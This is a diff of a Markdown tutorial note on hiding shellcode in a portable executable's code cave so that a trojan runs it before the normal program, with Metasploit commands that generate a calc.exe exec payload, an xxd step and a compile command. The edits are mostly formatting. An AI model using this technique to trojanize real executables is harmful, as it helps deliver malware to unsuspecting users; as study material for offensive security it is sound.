@@ -1,11 +1,11 @@
 ---
 title: Embedding Shellcode Code Caves
+date: 2026-02-22
 tags:
     - C++
     - WinAPI
+    - Metasploit
 ---
-
-#asm #windows 
 
 ## Theory
 
@@ -13,14 +13,13 @@ Load malicious bytes into the “code cave” of a portable executable.
 
 >  This doesn’t change the file size, because you will be replacing bytes that already exist with malicious code.
 
-
 Typically, when a PE file executes, it follows the instructions from top to bottom. In contrary, when a trojan executes, it will immediately jump to the section containing the shellcode, execute the it and then return back the top of the file and run the program as usual. 
 
 ## Practice
 
 Generate shellcode using Metasploit.
 
-```cpp
+```
 use payload/windows/exec
 set CMD calc.exe
 set EXITFUNC thread
@@ -29,18 +28,17 @@ generate -f raw -o calc.bin
 
 Alternatively, you can use a 64-bit shellcode using the following module.
 
-```cpp
+```
 use payload/windows/×64/exec
 ```
 
 Use xxd to get an overfile of the shellcode.
 
-```cpp
+```
 xxd calc.bin
 ```
 
 >  The final null byte indicates the end of the shellcode.
-
 
 Create the following source file. *(Note that this is C, and not C++)*
 
@@ -63,7 +61,7 @@ int main(VOID) {
 
 Compile the source code.
 
-```cpp
+```
 cl.exe /Zi /EHsc /nologo /FeC:\path\to\save\output\file.exe C:\path\to\get\source\file.c
 ```
 
